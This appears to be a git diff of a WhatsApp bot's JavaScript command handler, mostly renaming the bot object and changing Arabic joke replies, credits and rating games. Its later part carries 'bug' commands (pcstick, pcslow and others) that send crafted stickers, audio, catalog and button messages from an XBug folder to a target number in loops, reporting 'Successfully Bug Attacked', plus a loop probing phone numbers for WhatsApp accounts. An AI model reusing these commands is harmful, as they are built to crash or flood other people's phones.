 if (!m.isGroup) return m.reply(mess.group)
@@ -6762,7 +6762,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/husbu.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'نيكو':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6770,7 +6770,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/neko.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'randomanime':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6778,7 +6778,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/random.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'ريكا':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6786,7 +6786,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/shota.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'وايفي':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6794,7 +6794,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/waifu.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'genshin':
 try {
@@ -6815,7 +6815,7 @@ txt += `❄️ *Constellation:* ${anime.constellation}\n`
 txt += `📖 *Description:* ${anime.description}\n`
 txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
 urll = `https://api.genshin.dev/characters/${a}/portrait`
-await ElgazarBot.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
+await Elza3emgonBot.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
 } catch (err) {
 console.log(err)
 throw mess.error
@@ -6841,20 +6841,20 @@ let animetxt = `
 ♦️ *جرار: ${anime.trailer}*
 🌐 *الرابط: ${anime.url}*
 ❄ *الوصف:* ${anime.synopsis}*`
-                await ElgazarBot.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
+                await Elza3emgonBot.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                 break
 case 'patrick':
 case 'patricksticker': {
 var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await ElgazarBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await Elza3emgonBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 await fs.unlinkSync(encmedia)
 }
 break
 case 'ttp': {
            if (!text) return m.reply(`*Example : ${prefix + command} hello*`)
-           await ElgazarBot.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
+           await Elza3emgonBot.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
          
                      }
                      break
@@ -6864,7 +6864,7 @@ case 'dogestick':
 var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await ElgazarBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await Elza3emgonBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 await fs.unlinkSync(encmedia)
 }
 break
@@ -6873,7 +6873,7 @@ case 'lovestick' :{
 var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await ElgazarBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await Elza3emgonBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 await fs.unlinkSync(encmedia)
 }
 break
@@ -6882,7 +6882,7 @@ case 'gurastick':{
 var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await ElgazarBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await Elza3emgonBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 await fs.unlinkSync(encmedia)
 }
 break
@@ -6892,7 +6892,7 @@ break
                 let keh = bisa[Math.floor(Math.random() * bisa.length)]
                 let jawab = `*Can ${text}*\nAnswer : ${keh}`
                 let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'PATIENT 👀' }, type: 1 }]
-            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m)
             }
             break
             case 'is': {
@@ -6901,7 +6901,7 @@ break
                 let kah = apa[Math.floor(Math.random() * apa.length)]
                 let jawab = `*Is ${text}*\nAnswer : ${kah}`
                 let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
-            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m)
             }
             break
             case 'when': {
@@ -6910,7 +6910,7 @@ break
                 let koh = kapan[Math.floor(Math.random() * kapan.length)]
                 let jawab = `*${command} ${text}*\nAnswer : ${koh}`
                 let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'PATIENT 👀' }, type: 1 }]
-            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m)
             }
             break
 case 'what': {
@@ -6919,7 +6919,7 @@ case 'what': {
                 let kah = lel[Math.floor(Math.random() * lel.length)]
                 let jawab = `*What ${text}*\nAnswer : ${kah}`
                 let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
-            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m)
             }
             break
 case 'where': {
@@ -6928,7 +6928,7 @@ case 'where': {
                 let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                 let jawab = `*Whwre ${text}*\nAnswer : ${kah}`
                 let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
-            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m)
             }
             break
 case 'how': {
@@ -6937,42 +6937,48 @@ case 'how': {
                 let kah = gimana[Math.floor(Math.random() * gimana.length)]
                 let jawab = `*How ${text}*\nAnswer : ${kah}`
                 let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
-            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m)
             }
             break
 case 'الغباء': {
-            	if (!text) throw `مثال : ${prefix + command} عبدالله`
+            	if (!text) throw `مثال : ${prefix + command} غون`
             	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                 let kah = ra[Math.floor(Math.random() * ra.length)]
                 let jawab = `*الاسم ${text}*\nالاجابه : ${kah}%`
                 let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '😂​💔' }, type: 1 }]
-            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m)
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m)
             }
             break
 case 'بوت': {
-            	let lowq = `*البوت متصل ياجدعاااان🙋🏻‍♂️:*\n*${runtime(process.uptime())}*`
+            	let lowq = `*بالمناسبة انا اسمي غون ومتصل حاليا بلاش ازعاج لوسمحت👻:*\n*${runtime(process.uptime())}*`
                 let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'الاوامر' }, type: 1 }]
-                await ElgazarBot.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
+                await Elza3emgonBot.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
             	}
             break
+case 'حسين': case 'طوماس': {
+            	let lowq = `*مين الحلو الي قال اسمي⛄:*\n*${runtime(process.uptime())}*`
+                let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'انا♥🤙' }, type: 1 }]
+                await Elza3emgonBot.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
+            	}
+            break            
 case 'الحب':
-				if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @hussein`)
+				if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @gon`)
 					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const teng = gan[Math.floor(Math.random() * gan.length)]
-ElgazarBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالاجابه : *${teng}%*` }, { quoted: m })
+Elza3emgonBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالاجابه : *${teng}%*` }, { quoted: m })
 
 					break
 case 'الكره':
-				if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @hussein`)
+				if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @gon`)
 					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const tik = can[Math.floor(Math.random() * can.length)]
-ElgazarBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالاجابه : *${tik}%*` }, { quoted: m })
+Elza3emgonBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالاجابه : *${tik}%*` }, { quoted: m })
 					break
 					case 'شخصيتك':
-					if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @abdallah`)
-					const xeony =['زفت','واطي','غبي','مطيع','غلبان','جدع','طيب','حبوب','جميل','حمار','محترم','شرموط','كلب','ورع','جامد','برنس','ابن ناس','جميل','معفن', 'بياخد فيها','وسخ','منحرف'،'بتاع بنات','انثى','عمه بهجت صابر','كل يوم بيحضر Xx',']
+					if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @gon`)
+					const xeony =['زفت','واطي','غبي','مطيع','غلبان','جدع','طيب','حبوب','جميل','حمار','محترم','لطيف','كلب','عيل','حيوان','منحرف','بتاع بنات']
 					const taky = xeony[Math.floor(Math.random() * xeony.length)]
-					ElgazarBot.sendMessage(from, { text: `التحقق من الشخصيه : ${q}\nالاجابه : *${taky}*` }, { quoted: m })
+					Elza3emgonBot.sendMessage(from, { text: `التحقق من الشخصيه : ${q}\nالاجابه : *${taky}*` }, { quoted: m })
 				     break
                     case 'تتتتتتتتت':
   case 'greatcheck':
@@ -6984,10 +6990,10 @@ ElgazarBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالا�
                  case 'prettycheck':
                     case 'lovelycheck':
                       case 'uglycheck':
-				if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @abdallah`)
+				if (!text) return m.reply(`منشن علي شخص, مثال : ${prefix + command} @gon`)
 					const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
-ElgazarBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالاجابه : *${sange}%*` }, { quoted: m })
+Elza3emgonBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالاجابه : *${sange}%*` }, { quoted: m })
 					break
                     case 'احمق':
       case 'بشع':
@@ -7048,7 +7054,7 @@ ElgazarBot.sendMessage(from, { text: `*${command}*\n\nالاسم : ${q}\nالا�
             let buttons = [
                         { buttonId: 'oke', buttonText: { displayText: 'اتفق😂💔' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
             }
             break
 case 'id':{
@@ -7062,7 +7068,7 @@ case 'toqr':{
    let buff = getRandom('.jpg')
    await fs.writeFileSync('./'+buff, data)
    let medi = fs.readFileSync('./' + buff)
-  await ElgazarBot.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
+  await Elza3emgonBot.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
    setTimeout(() => { fs.unlinkSync(buff) }, 10000)
   }
   break
@@ -7072,7 +7078,7 @@ if (args.length === 0) throw `أين الرابط?\nارسل ${prefix + command}
         if (!(urlInsta.includes("instagram.com/p/") ||
             urlInsta.includes("instagram.com/reel/") ||
             urlInsta.includes("instagram.com/tv/")))
-            return ElgazarBot.sendMessage(
+            return Elza3emgonBot.sendMessage(
                 m.chat,
                 { text: `الرابط الذي قدمته ليس رابط انستجرام` },
                 { quoted: m }
@@ -7083,7 +7089,7 @@ if (args.length === 0) throw `أين الرابط?\nارسل ${prefix + command}
         ig.fetchPost(urlInsta).then((res) => {
             if (res.media_count == 1) {
                 if (res.links[0].type == "video") {
-                    ElgazarBot.sendMessage(
+                    Elza3emgonBot.sendMessage(
                         m.chat,
                         {
                             video: { url: res.links[0].url }
@@ -7091,7 +7097,7 @@ if (args.length === 0) throw `أين الرابط?\nارسل ${prefix + command}
                         { quoted: m }
                     )
                 }else if (res.links[0].type == "image") {
-                    ElgazarBot.sendMessage(
+                    Elza3emgonBot.sendMessage(
                         m.chat,
                         {
                             image: { url: res.links[0].url }
@@ -7103,7 +7109,7 @@ if (args.length === 0) throw `أين الرابط?\nارسل ${prefix + command}
             else if (res.media_count > 1) {
                 for (let i = 0; i < res.media_count; i++) {
                     if (res.links[i].type == "video") {
-                        ElgazarBot.sendMessage(
+                        Elza3emgonBot.sendMessage(
                             m.chat,
                             {
                                 video: { url: res.links[i].url }
@@ -7111,7 +7117,7 @@ if (args.length === 0) throw `أين الرابط?\nارسل ${prefix + command}
                             { quoted: m }
                         )
                     } else if (res.links[i].type == "image") {
-                        ElgazarBot.sendMessage(
+                        Elza3emgonBot.sendMessage(
                             m.chat,
                             {
                                 image: { url: res.links[i].url }
@@ -7123,7 +7129,7 @@ if (args.length === 0) throw `أين الرابط?\nارسل ${prefix + command}
             }            
         }).catch((error) => {
             console.log(error);
-            ElgazarBot.sendMessage(m.chat, { text: `يجب أن يكون خاصًا أو غير متاح` }, { quoted: m })
+            Elza3emgonBot.sendMessage(m.chat, { text: `يجب أن يكون خاصًا أو غير متاح` }, { quoted: m })
         });
 }
 break
@@ -7137,9 +7143,9 @@ if (!text) return m.reply(`Where is the link?`)
         const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
             ','
         )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
-       const response = await ElgazarBot.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
+       const response = await Elza3emgonBot.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
         const bufferpotify = await spotify.download()
-        await ElgazarBot.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
+        await Elza3emgonBot.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
 break
 case 'reddit': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
 if (!text) throw `Where is the subreddit name?`
@@ -7151,7 +7157,7 @@ RedditImageFetcher.fetch({
         }).then(result => {
             console.log(result);
             let akusingle = result[0]
-            ElgazarBot.sendMessage(m.chat,{image:{url:akusingle.image}},{quoted:m})
+            Elza3emgonBot.sendMessage(m.chat,{image:{url:akusingle.image}},{quoted:m})
         })
         .catch(err => {
             m.reply ("Not found!")
@@ -7170,21 +7176,20 @@ const reply = `
 *${themeemoji} Example:* ${targetfine.data.list[0].example
     .replace(/\[/g, "")
     .replace(/\]/g, "")}`
-   ElgazarBot.sendMessage(m.chat,{text:reply},{quoted:m})
+   Elza3emgonBot.sendMessage(m.chat,{text:reply},{quoted:m})
 } catch (err) {
     console.log(err)
     return m.reply (`*${q}* isn't a valid text`)
     }
     break
 case 'السورس': case 'script': {
-teks = `⋆ تم تطوير وبرمجه هذا السورس •
-⋆ بواسطه حسين علي •
-⋆ اللقب: توماس •
-⋆ يمكنك التواصل مع المبرمج عبر التيلجرام ⤌⤈
- https://t.me/husseinali_1
-تبعني عبر اليوتيوب ⤌⤈
+teks = `☆ تم تطوير وبرمجه هذا السورس ↯
+☆ بواسطه توماس ↯
+☆ يمكنك التواصل مع المبرمج عبر الواتساب ⤌⤈
+https://wa.me/+201146121794
+تابعني عبر اليوتيوب ياحب ⤌⤈
 https://youtube.com/@MR_ThomasFF
-واشترك وفعل الجرس..🌍🔥`
+اشترك وفعل الجرس🔔وانتظر كل جديد😁`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
 ]
@@ -7196,85 +7201,58 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
-body: "سورس غون ", 
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
+body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
 mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
             
-case 'غون': case 'جيت': 
-if (!text) return m.reply(`هلا وغلا ياحب`)
+case 'غون':
+if (!text) return m.reply(`هلا يحب`)
 break
 
-case 'سلام': case 'السلام': 
-if (!text) return m.reply(`وعليكم السلام ورحمة الله وبركاته`)
+case 'نعم':
+if (!text) return m.reply(`نعامه ترفسك`)
 break
 
-case 'حسين':
-if (!text) return m.reply(`احلى من قال اسمي♥`)
+case 'يب':
+if (!text) return m.reply(`ياواااد استرجل وقول نعم`)
 break
 
-case 'تبن':
-if (!text) return m.reply(`تبن بلدك ولا تبن جاموس😂`)
+case 'سلام':
+if (!text) return m.reply(`سلامات`)
+break
+
+case '🗿':
+if (!text) return m.reply(`وجهك مسطح😹`)
 break
 
 case '🐦':
 if (!text) return m.reply(`انظر بعيد`)
 break
 
-case '🗿':
-if (!text) return m.reply(`وجهك مسطح`)
+case 'نظرت':
+if (!text) return m.reply(`نعم كدا احسن`)
 break
 
-case 'باي':
-if (!text) return m.reply(`في داهيه`)
+case 'روح نام':
+if (!text) return m.reply(`الحربم بالاول😉`)
 break
 
-case 'سكربت': case 'التنصيب': 
-if (!text) return m.reply(`مفيش روح نام`)
-break
-   
-case 'ههه': case'هههه': case 'ههههه': case 'هههههه': case 'ههههههه': case 'هههههههه': 
-if (!text) return m.reply(`تدوم الضحكه الحلوة😊`)
-break                                      
-
-case '😂': case '😂😂': case '😂😂😂': case '😂😂😂😂': case '😂😂😂😂😂': 
-if (!text) return m.reply(`تدوم الضحكه الحلوة😍`)
+case 'ليش':
+if (!text) return m.reply(`لانك حريمه🗿`)
 break
 
-case 'احبك': case 'بحبك': 
-if (!text) return m.reply(`هممم مشكوك فيك😐`)
-break
-
-case 'اممم': case 'امممم': case 'اممممم'
-if (!text) return m.reply(`متل م تفعل البقره:`)
-break
-
-case 'غون كيفك':
-if (!text) return m.reply(`بخير الحمدلله`)
+case 'لا':
+if (!text) return m.reply(`طيب اسكت فهمنا🙂`)
 break 
- 
-case 'غون وينك':
-if (!text) return m.reply(`بالحمام شو شايفني وين😹`)
-break
-
-case 'تست':
-if (!text) return m.reply(`تستووو🤙🌝`)
-break
- 
-case 'كيوت':
-if (!text) return m.reply(`كيت كيت😪⛄`)
-break                                         
-case 'كلزق': case 'كلخرا': 
-if (!text) return m.reply(`مين ياكلك انت😐`)
-break
-                            
+                                         
 case 'quotes':
 const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
         const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
@@ -7291,7 +7269,7 @@ case 'resetgruplink': {
 if (!m.isGroup) return m.reply(mess.group)
 if (!isBotAdmins) return m.reply(mess.botAdmin)
 if (!isAdmins && !isCreator) return m.reply(mess.admin)
-ElgazarBot.groupRevokeInvite(m.chat)
+Elza3emgonBot.groupRevokeInvite(m.chat)
 }
 break
 case 'imdb':
@@ -7317,7 +7295,7 @@ if (!text) return m.reply(`_Name a Series or movie`)
             imdbt += "🏙️Production : " + fids.data.Production + "\n"
             imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
             imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
-           ElgazarBot.sendMessage(m.chat, {
+           Elza3emgonBot.sendMessage(m.chat, {
                 image: {
                     url: fids.data.Poster,
                 },
@@ -7344,7 +7322,7 @@ if (!text) return m.reply('What location?')
             textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
             textw += `*Country:-* ${wdata.data.sys.country}\n`
 
-           ElgazarBot.sendMessage(
+           Elza3emgonBot.sendMessage(
                 m.chat, {
                     text: textw,
                 }, {
@@ -7417,11 +7395,11 @@ var inputnumber = text.split(" ")[0]
             } else if (random_length == 4) {
                 random21 = `${status1}${status2}${status3}${dom4}`
             }
-            var anu = await ElgazarBot.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
+            var anu = await Elza3emgonBot.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
             var anuu = anu.length !== 0 ? anu : false
             try {
                 try {
-                    var anu1 = await ElgazarBot.fetchStatus(anu[0].jid)
+                    var anu1 = await Elza3emgonBot.fetchStatus(anu[0].jid)
                 } catch {
                     var anu1 = '401'
                 }
@@ -7455,7 +7433,7 @@ case 'pcbut':
                           buttons: buttonvirus,
                           headerType: 1
                       }
-                      ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, buttonMsgX)
+                      Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, buttonMsgX)
                       reply(mess.success)
                     break
 case 'pcstick':{
@@ -7477,7 +7455,7 @@ xeonOP = {
         } 
     }
  xeonsteker = fs.readFileSync('./XBug/xstick.webp')
-ElgazarBot.sendImageAsSticker(`${text}@s.whatsapp.net`, xeonsteker, xeonOP, { packname: global.packname, author: global.author })
+Elza3emgonBot.sendImageAsSticker(`${text}@s.whatsapp.net`, xeonsteker, xeonOP, { packname: global.packname, author: global.author })
 await reply(`Successfully bug sticker attacked ${text}@s.whatsapp.net`)
 }
 break
@@ -7500,7 +7478,7 @@ xeonvn = {
         } 
     }
  xaudio = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
- ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {audio: xaudio, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonvn})
+ Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {audio: xaudio, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonvn})
 await reply(`Successfully Bug Attacked The Number ${text}@s.whatsapp.net`)
 }
 break
@@ -7512,7 +7490,7 @@ if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${pre
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
 const xeontalog = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
-var xeonmess = await prepareWAMessageMedia({ image: xpicvirus }, { upload: ElgazarBot.waUploadToServer })
+var xeonmess = await prepareWAMessageMedia({ image: xpicvirus }, { upload: Elza3emgonBot.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productMessage": {
 "product": {
@@ -7532,7 +7510,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "businessOwnerJid": "916909137213@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: xeontalog })
-ElgazarBot.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+Elza3emgonBot.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 }
 }
 break
@@ -7557,7 +7535,7 @@ xeonyvn = {
         } 
     }
  xeonyaud = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
- ElgazarBot.sendMessage(m.chat, {audio: xeonyaud, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonyvn})
+ Elza3emgonBot.sendMessage(m.chat, {audio: xeonyaud, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonyvn})
  }
  }
 break
@@ -7567,7 +7545,7 @@ break
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-ElgazarBot.sendMessage(m.chat, {document: xpicvirus},{quoted: {
+Elza3emgonBot.sendMessage(m.chat, {document: xpicvirus},{quoted: {
 key: {
 fromMe: false, 
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
@@ -7606,59 +7584,59 @@ case 'pcslow': {
                         } 
                     } 
                 }
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
